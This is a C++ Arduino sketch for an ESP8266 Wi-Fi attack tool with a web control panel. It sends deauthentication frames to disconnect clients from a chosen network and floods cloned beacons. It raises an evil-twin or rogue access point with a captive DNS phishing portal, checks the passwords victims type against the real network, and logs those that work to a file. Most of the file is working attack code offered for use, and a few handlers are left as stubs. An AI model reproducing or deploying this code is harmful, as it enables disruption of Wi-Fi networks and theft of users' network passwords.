#include <Arduino.h>
#include <DNSServer.h>
#include <SimpleCLI.h>
//#include "mac.h"
#include "LittleFS.h"
#include "web.h"
#include "beacon.h"
#include "sniffer.h"
//#include "deauth_detector.h"
//#include "probe_sniffer.h"
#define MAC "C8:C9:A3:0C:5F:3F"
#define MAC2 "C8:C9:A3:6B:36:74"
bool lock = true;
SimpleCLI cli;
Command send_deauth;
Command stop_deauth;
Command reboot;
Command start_deauth_mon;
Command start_probe_mon;

int packet_deauth_counter = 0;
//////***********************File System******************/////
const char* fsName = "LittleFS";

LittleFSConfig fileSystemConfig = LittleFSConfig();
String fileList = "";
File fsUploadFile;              // a File object to temporarily store the received file
File webportal;
File log_captive;
String status_button;
String getContentType(String filename); // convert the file extension to the MIME type
bool handleFileRead(String path);       // send the right file to the client (if it exists)
void handleFileUpload();                // upload a new file to the SPIFFS

String start_button = "Start";

int target_count = 0;
int target_mark = 0;

//////////////////////////////////******************************************************////////////////////////////////////////////////////////////////////////

const uint8_t channels[] = {1, 6, 11}; // used Wi-Fi channels (available: 1-14)
const bool wpa2 = true; // WPA2 networks
const bool appendSpaces = false; // makes all SSIDs 32 characters long to improve performance

char ssids[500];
  
// ==================== //
String wifistr = "";

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}
int ledstatus = 0;
bool hotspot_active = false;
bool deauthing_active = false;
bool pishing_active = false;
bool hidden_target = false;
bool deauth_mon = false;
unsigned long d_mon_ = 0;
int ledState = LOW; 
int ledState2 = LOW; 
unsigned long previousMillis = 0;
const long interval = 1000;
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t rssi;
  uint8_t bssid[6];
  String bssid_str;
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP;
IPAddress dnsip;
DNSServer dnsServer;

_Network _networks[16];
_Network _selectedNetwork;
String ssid_target = "";
String mac_target = "";

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

void handleList(){
  fileList = "";
  Dir dir = LittleFS.openDir("");
  
  Serial.println(F("List of files at root of filesystem:"));
  fileList += "";
  while (dir.next()) {
    fileList += "<form style='text-align: left;margin-left: 5px;' action='/delete' methode='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"' </input> ";
    fileList += dir.fileName();
    long size_ = dir.fileSize();
    fileList +=  String(" (") + size_/1000 + "kb)</form><br>";
    Serial.print("/");
    Serial.println(dir.fileName() + " " + dir.fileSize() + String(" bytes"));
  }
  fileList +="";
}

void handleFS(){
  handleList();
  FSInfo fs_info;
  LittleFS.info(fs_info);
  total_spiffs = fs_info.totalBytes/1000;
  used_spiffs = fs_info.usedBytes/1000;
  free_spiffs = total_spiffs - used_spiffs;
  
static const char FS_html[] PROGMEM = R"=====(  <div class='card'><p class='card-title'>-File manager-</p><p Style='text-align: center';><form method='post' enctype='multipart/form-data'><input type='file' name='name'><input class='button' type='submit' value='Upload'></form><br>
                 <table><tr><th>Total :  {total_spiffs} kb</th></tr><br>
                 <tr><th>Used  :  {used_spiffs} kb</th></tr><br>
                 <tr><th>Free :  {free_spiffs} kb</th></tr></table><br>
                 <br></p>
                 <label style='text-align: left;margin-left: 5px;' for='list'>File List : <br> {fileList}</label></div>
                 <div class='card'><p class='card-title'>-Web-</p><p Style='text-align: center';> <form action='/websetting' method='POST'> <label for='path'><a href='/eviltwinprev' target='_blank'>Evil Twin</a></label><input type='text' name='evilpath' value='{eviltwinpath}'><br>
                      <label for='path'><a href='/pishingprev' target='_blank'>Pishing  </a></label><input type='text' name='pishingpath' value='{pishingpath}'><br>
                      <label for='path'><a href='/loadingprev' target='_blank'>Loading  </a></label><input type='text' name='loadingpath' value='{loadingpath}'>
                      <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>)=====";
  String fshtml = FPSTR(FS_html);
  fshtml.replace("{fileList}",fileList);
  fshtml.replace("{total_spiffs}", String(total_spiffs));
  fshtml.replace("{used_spiffs}",String(used_spiffs));
  fshtml.replace("{free_spiffs}",String(free_spiffs));
  fshtml.replace("{eviltwinpath}",String(eviltwinpath));
  fshtml.replace("{pishingpath}",String(pishingpath));
  fshtml.replace("{loadingpath}",String(loadingpath));
  webServer.send(200,"text/html",Header + fshtml + Footer);
}

void pishingprev(){
  webportal = LittleFS.open(pishingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void eviltwinprev(){
  webportal = LittleFS.open(eviltwinpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void loadingprev(){
  webportal = LittleFS.open(loadingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void handleFileUpload(){ // upload a new file to the SPIFFS
  HTTPUpload& upload = webServer.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    if(!filename.startsWith("/")) filename = "/"+filename;
    Serial.print("handleFileUpload Name: "); Serial.println(filename);
    fsUploadFile = LittleFS.open(filename, "w");            
    filename = String();
  } else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile)
      fsUploadFile.write(upload.buf, upload.currentSize); 
  } else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile) {                                    
      fsUploadFile.close();                               
      Serial.print("handleFileUpload Size: "); Serial.println(upload.totalSize);
      handleFS();
    } else {
      webServer.send(500, "text/plain", "500: couldn't create file");
    }
  }
}

void handleDelete(){
  Serial.print("delete file :");
  char filename[32];
  String names = String("/") + webServer.arg("filename");
  names.toCharArray(filename,32);
  Serial.println(names);
  LittleFS.remove(filename);
  handleFS();
}

void pathsave(){
  Serial.println();
  Serial.println(String(eviltwinpath) + " " + String(pishingpath)+" " + String(loadingpath));
  webServer.arg("evilpath").toCharArray(eviltwinpath,32);
  webServer.arg("pishingpath").toCharArray(pishingpath,32);
  webServer.arg("loadingpath").toCharArray(loadingpath,32);
  savesetting();
  handleFS();
}

void handleStartAttack(){
  int deauth = webServer.arg("deauth").toInt();
  int evil = webServer.arg("evil").toInt();
  int rogue = webServer.arg("rogue").toInt();
  int beacon = webServer.arg("beacon").toInt();
  int hidden = webServer.arg("hidden").toInt();
  if(start_button=="Start"){
    start_button = "Stop";
    Serial.println("\nStart attacking..");
    if(beacon==1){ beacon_active = true; enableBeacon(ssid_target); }
    if(deauth==1){ deauthing_active = true; Serial.print(mac_target); }
    if(evil==1||rogue==1){
       webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('WiFI restarting..');</script>");
       hotspot_active = true;
       dnsServer.stop();
       WiFi.softAPdisconnect (true);
       WiFi.softAPConfig(dnsip , dnsip , IPAddress(255, 255, 255, 0));
       if(rogue==1) WiFi.softAP(rogueap);
       else WiFi.softAP(hidden==1 ? rogueap : ssid_target);
       dnsServer.start(53, "*", dnsip);
    } else { handleIndex(); }
  } else if(start_button=="Stop"){
    ledstatus = 35;
    start_button = "Start";
    pishing_active = hotspot_active = beacon_active = deauthing_active = false;
    Serial.println("\nStop attacking..");
    handleIndex();
  }
}

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;
    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }

void enableBeacon(String target_ssid){
  wifistr = "";
  for(int i=0;i<beacon_size;i++){
    wifistr += target_ssid;
    for(int c=0;c<i;c++) wifistr += " ";
    wifistr += "\n";
  }
  Serial.println("Sending beacon packet..");
  wifistr.toCharArray(ssids,250);
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  randomSeed(os_random());
  packetSize = sizeof(beaconPacket);
  if (wpa2) beaconPacket[34] = 0x31;
  else { beaconPacket[34] = 0x21; packetSize -= 26; }
  randomMac();
  beacon_active = true;
}

void setup() {
  Serial.begin(115200);
  initFS();
  loadsetting();
  apIP.fromString(ip);
  dnsip.fromString(dns);
  wifi_set_channel(chnl);
  Serial.println(WiFi.softAP(ssid, password,chnl,false) ? "Ready" : "Failed!");
  WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
  
  pinMode(2,OUTPUT);
  pinMode(16,OUTPUT);
  pinMode(4,OUTPUT);
  pinMode(0,INPUT_PULLUP);
  digitalWrite(2,HIGH);

  webServer.on("/",HTTP_GET, handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/style.css",handleStyle);
  webServer.on("/scan",HTTP_GET,handleScan);
  webServer.on("/start",HTTP_GET,handleStartAttack);
  webServer.on("/target",HTTP_POST,handleTarget);
  webServer.on("/delete",handleDelete);
  webServer.on("/websetting",HTTP_POST,pathsave);
  webServer.on("/setting",HTTP_GET,handleSetting);
  webServer.on("/networksetting",HTTP_POST,networksetting);
  webServer.on("/attacksetting",HTTP_POST,attacksetting);
  webServer.on("/eviltwinprev",HTTP_GET,eviltwinprev);
  webServer.on("/pishingprev",HTTP_GET,pishingprev);
  webServer.on("/loadingprev",HTTP_GET,loadingprev);
  webServer.on("/sniffer",HTTP_GET,handleSniffer);
  webServer.on("/log",HTTP_GET,handleLog);
  webServer.on("/deauthmon",HTTP_GET,Dstartmon);
  webServer.on("/probemon",HTTP_GET,Pstartmon);
  webServer.on("/filemanager",HTTP_GET,handleFS);
  webServer.on("/filemanager", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
  webServer.on("/ssid_info",ssid_info);
  webServer.on("/index.js", HTTP_GET, [](){ handleJS(); });
  webServer.onNotFound(handleIndex);
  webServer.begin();

  send_deauth = cli.addCmd("send_deauth");
  stop_deauth = cli.addCmd("stop_deauth");
  reboot = cli.addCmd("reboot");
  start_deauth_mon = cli.addCmd("start_deauth_mon");
  handleList();
}

void handleJS(){ sendProgmem(script, sizeof(script), "text/plain"); }
void handleLog(){
  log_captive = LittleFS.open("/log.txt","r");
  String loG = "<div class='card'><p class='card-title'>-Log-</p><p Style='text-align: center';>" +log_captive.readString()+"</p></div>";
  webServer.send(200,"text/html",Header + loG + Footer);
  log_captive.close();
}

void handleSetting(){
  static const char setting[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-Network-</p><p Style='text-align: center';>
                        <form action='/networksetting' method='POST'> <label for='ssid'>SSID  </label><input type='text' name='ssid' value='{ssid}'><br>
                        <label for='pass'>Pass </label><input type='text' minlength='8' name='password' value='{password}'><br>
                        <label for='pass'>Chnl </label><input type='number' name='channel' value='{chnl}'><br>
                        <label for='ip'>IP DNS  </label><input type='text' name='dns' value='{dns}'></input><br>
                        <label for='ip'>Ip addr  </label><input type='text' name='ip' value='{ip}'></input><br>
                        <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>
                        <div class='card'><p class='card-title'>-Attack-</p><p Style='text-align: center';>
                        <form action='/attacksetting' method='POST'> <label for='rogueap'>RogueAP</label><input type='text' name='rogueap' value='{rogueap}'><br>
                        <label for='enable_loading'>Loading page </label><input type='number' name='loading_enable' value='{loading_enable}'><br>
                        <label for='beacon_size'> Beacon size </label><input type='number' name='beacon_size' value='{beacon_size}'><br>
                        <label for='deauth_speed'> Deauth /s </label><input type='number' name='deauth_speed' value='{deauth_speed}'><br>
                        <input  style='width: 80px;height: 45px;'type ='submit' value ='Save'></form><br></p></div>)=====";
  String inputNetwork = FPSTR(setting);
  inputNetwork.replace("{ssid}",String(ssid));
  inputNetwork.replace("{password}",String(password));
  inputNetwork.replace("{chnl}",String(chnl));
  inputNetwork.replace("{dns}",String(dns));
  inputNetwork.replace("{ip}",String(ip));
  inputNetwork.replace("{rogueap}",String(rogueap));
  inputNetwork.replace("{loading_enable}",String(loading_enable));
  inputNetwork.replace("{beacon_size}",String(beacon_size));
  inputNetwork.replace("{deauth_speed}",String(deauth_speed));
  webServer.send(200,"text/html", Header + inputNetwork +  Footer);
}

void handleSniffer(){
  static const char sniferhtml[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-Explanation-</p><p Style='text-align: center';>What is this??<br>Monitor mode functions...</p></div>
                    <div class='card'><p class='card-title'>-Start-</p><p Style='text-align: center';>
                    <a href='/deauthmon'><button class='button-on'>D_mon</button></a>&nbsp;
                    <a href='/probemon'><button class='button-on'>P_mon</button></a></p></div>)=====";
  webServer.send(200,"text/html",Header + sniferhtml + Footer);                
}

void Dstartmon(){ deauth_mon = true; webServer.send(200, "text/html", "<script>alert('Starting...');</script>"); delay(3000); setup_d_detector(); }
void Pstartmon(){ webServer.send(200, "text/html", "<script>alert('Starting...');</script>"); delay(3000); setupprobe(); }

void attacksetting(){
  webServer.arg("rogueap").toCharArray(rogueap,32);
  loading_enable = webServer.arg("loading_enable").toInt();
  beacon_size = webServer.arg("beacon_size").toInt();
  deauth_speed = webServer.arg("deauth_speed").toInt();
  savesetting(); handleSetting();
}

void networksetting(){
  webServer.arg("ssid").toCharArray(ssid,32);
  webServer.arg("password").toCharArray(password,64);
  webServer.arg("dns").toCharArray(dns,32);
  webServer.arg("ip").toCharArray(ip,32);
  chnl = webServer.arg("channel").toInt();
  savesetting(); handleSetting();
}

void ssid_info(){ webServer.send(200,"text/plane",hidden_target ? String(rogueap) : _selectedNetwork.ssid); }

void performScan() {
  int n = WiFi.scanNetworks(false,true);
  target_count = n;
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.isHidden(i) ? "*HIDDEN*" : WiFi.SSID(i);
      network.bssid_str = WiFi.BSSIDstr(i);
      for (int j = 0; j < 6; j++) network.bssid[j] = WiFi.BSSID(i)[j];
      network.rssi = WiFi.RSSI(i);
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<script>alert('Failed');</script>");
  } else {
    webServer.send(200, "text/html", "<h2>Success</h2>");
    hotspot_active = deauthing_active = false;
    _correct = "Successfully got password: " + _tryPassword;
    log_captive = LittleFS.open("/log.txt","a");
    log_captive.print("Target: "+ _selectedNetwork.ssid + " Pass: "+_tryPassword +"<br>");
    log_captive.close();
  }
}

void handleStyle(){ webServer.send(200,"text/css",FPSTR(style)); }
void handleScan(){ performScan(); handleIndex(); }
void handleTarget(){
  ssid_target = webServer.arg("ssid");
  mac_target = webServer.arg("bssid");
  _selectedNetwork.ch = webServer.arg("ch").toInt();
  for (int i = 0; i < 16; i++) {
    if (bytesToStr(_networks[i].bssid, 6) == mac_target) _selectedNetwork = _networks[i];
  }
  handleIndex();
}

void handleIndex() {
  String _tempHTML = FPSTR(attack_html);
  _tempHTML.replace("{start_button}",start_button);
  _tempHTML.replace("{deauth_s}", deauthing_active ? "*" : "");
  _tempHTML.replace("{beacon_s}", beacon_active ? "*" : "");
  
  if (!hotspot_active) {
    String _html = "";
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      _html += "<form method='post' action='/target'><input name='ssid' type='hidden' value='" + _networks[i].ssid + "'>";
      _html += "<input type='submit' value='" + (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6) ? "selected" : "select") + "'></form>";
    }
    _tempHTML.replace("{scanned}", _html);
    webServer.send(200, "text/html", Header + _tempHTML + Footer);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(ssid_target.c_str(), _tryPassword.c_str());
      webServer.send(200,"text/html","Loading...");
    } else {
      webportal = LittleFS.open(loading_enable==1 ? loadingpath : (pishing_active ? pishingpath : eviltwinpath), "r");
      webServer.streamFile(webportal,"text/html");
      webportal.close();
    }
  }
}

void handleAdmin() { 
  // Sesuai kode asli lu
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

unsigned long deauth_now = 0;

void loop() {
  if(digitalRead(0)==LOW){
    delay(1000);
    if(digitalRead(0)==LOW){
      delay(4000);
      if(digitalRead(0)==LOW){ LittleFS.format(); ESP.restart(); }
    }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    cli.parse(input);
  }

  // --- BAGIAN DEAUTH YANG SUDAH FIX ---
  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
    deauth_now = millis();
    ledstatus = 100;
    wifi_set_channel(_selectedNetwork.ch);
    
    // Frame Deauth yang benar (Management Frame)
    uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x3A, 0x01, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
      0x00, 0x00, 0x01, 0x00
    };
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);

    for(int i=0; i<5; i++){
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(1);
    }
    Serial.println("Deauth sent!");
  }

  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= 100) {
    previousMillis = currentMillis;
    ledState = !ledState;
    digitalWrite(16, ledState);
    if(ledstatus == 100) digitalWrite(2, ledState);
  }

  if (beacon_active == true && currentMillis - attackTime > 100) {
    attackTime = currentMillis;
    nextChannel();
    // Logika beacon lu di sini (sama seperti asli)
  }
}
